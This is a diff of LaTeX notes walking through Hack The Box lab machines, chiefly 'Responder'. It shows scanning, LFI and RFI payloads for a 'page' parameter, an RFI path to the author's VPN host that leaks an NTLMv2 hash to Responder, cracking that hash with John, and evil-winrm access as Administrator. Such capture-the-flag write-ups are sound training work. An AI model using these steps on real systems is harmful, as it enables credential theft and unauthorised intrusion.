@@ -582,7 +582,7 @@ In SQL, what symbol do we need to end each query with? \mintinline{bash}{;}.
 
 There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host? \mintinline{bash}{htb}.
 \begin{session}
-[sekai@arch ~]$ mariadb -u root -h 10.129.44.239
+[sekai@arch ~]$ mariadb -u root -h "10.129.44.239"
 \end{session}
 \begin{sql}
 MariaDB [(none)]> show databases;
@@ -646,5 +646,118 @@ gobuster dir -x php -w directory-list-2.3-medium.txt -u 10.129.222.85
 Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? \mintinline{bash}{login.php}.
 
 Go to \mintinline{bash}{10.129.222.85/login.php} and put \mintinline{bash}{username=admin} and \mintinline{bash}{password=rKXM59ESxesUFHAd}.
+
+\subsection{Responder \faWindows}
+
+When visiting the web service using the IP address, what is the domain that we are being redirected to? \mintinline{bash}{unika.htb}.
+\begin{session}
+[sekai@arch ~]# sudo nmap -T5 -sC -sV -O -p 80 "10.129.97.105"
+\end{session}
+\begin{txt}
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+\end{txt}
+
+Which scripting language is being used on the server to generate webpages? \mintinline{bash}{php}.
+\begin{session}
+[sekai@arch ~]# gobuster dir -x html \
+-w Workspace/wordlists/directory-list-2.3-small.txt -u "10.129.97.105"
+\end{session}
+\begin{bash}
+/english.html         (Status: 200) [Size: 46453]
+/french.html          (Status: 200) [Size: 47199]
+/german.html          (Status: 200) [Size: 46984]
+\end{bash}
+
+What is the name of the URL parameter which is used to load different language versions of the webpage? \mintinline{bash}{page}.
+
+We can access \mintinline{html}{http://10.129.97.105/english.html}, \mintinline{html}{http://10.129.97.105/french.html}, etc.
+
+In order to access \mintinline{html}{http://10.129.97.105} (it redirects us to \mintinline{html}{http://unika.htb}, which has no connection), we need to change our \mintinline{bash}{/etc/hosts} file:
+\begin{bash}
+/etc/hosts
+# custom hosts
+10.129.97.105   unika.htb
+\end{bash}
+
+Which of the following values for the `page' parameter would be an example of exploiting a Local File Include (LFI) vulnerability: ``french.html'', ``//10.10.14.6/somefile'', ``../../../../../../../../windows/system32/drivers/etc/hosts'', ``minikatz.exe''
+\begin{bash}
+../../../../../../../../windows/system32/drivers/etc/hosts
+\end{bash}
+
+Which of the following values for the `page' parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: ``french.html'', ``//10.10.14.6/somefile'', ``../../../../../../../../windows/system32/drivers/etc/hosts'', ``minikatz.exe''
+\begin{bash}
+//10.10.14.208/somefile
+\end{bash}
+
+In this case \mintinline{bash}{10.10.14.208} is my IP address on the VPN.
+
+What does NTLM stand for? New Technology LAN Manager.
+
+Which flag do we use in the Responder utility to specify the network interface? \mintinline{bash}{-I}.
+\begin{bash}
+yay -S responder
+echo "sometext" > somefile
+ip a
+responder -I tun0
+\end{bash}
+
+There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john', but the full name is what? John the Ripper.
+
+Then we go to \mintinline{html}{unika.htb/?page=//10.10.14.208/somefile}. The \mintinline{bash}{responder} utility than obtains a NTLMv2 hash. We save it to \mintinline{bash}{hash.txt}, then use \mintinline{bash}{john}:
+\begin{bash}
+sudo pacman -S john
+tldr john
+john hash.txt
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+badminton        (Administrator)
+\end{bash}
+
+What is the password for the administrator user? \mintinline{bash}{badminton}.
+
+We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? \mintinline{bash}{5985}, result of our scan.
+
+We need to install \mintinline{bash}{evil-winrm} to remotely access the Windows service.
+\begin{bash}
+yay -S ruby-evil-winrm
+tldr evil-winrm
+evil-winrm --ip 10.129.83.31 --user Administrator --password badminton -P 5985
+\end{bash}
+
+We get the error
+\begin{bash}
+Error: An error of type OpenSSL::Digest::DigestError happened, message is Digest
+initialization failed: initialization error
+\end{bash}
+
+I found the \href{https://forum.manjaro.org/t/openssl-issue-with-ruby-3-0-6p216/147369}{solution} to this issue by editing the \mintinline{bash}{/etc/ssl/openssl.cnf} file. The following sections need to be modified:
+\begin{bash}
+[provider_sect]
+default = default_sect
+legacy = legacy_sect
+
+[default_sect]
+activate = 1
+
+[legacy_sect]
+activate = 1
+\end{bash}
+
+Now we can hack the machine:
+\begin{bash}
+evil-winrm --ip 10.129.97.105 --user Administrator --password badminton -P 5985
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ..
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users/mike
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users/mike/Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat /Users/mike/Desktop/flag.txt
+*Evil-WinRM* PS C:\Users\Administrator\Documents> exit
+\end{bash}
 
 \end{document}
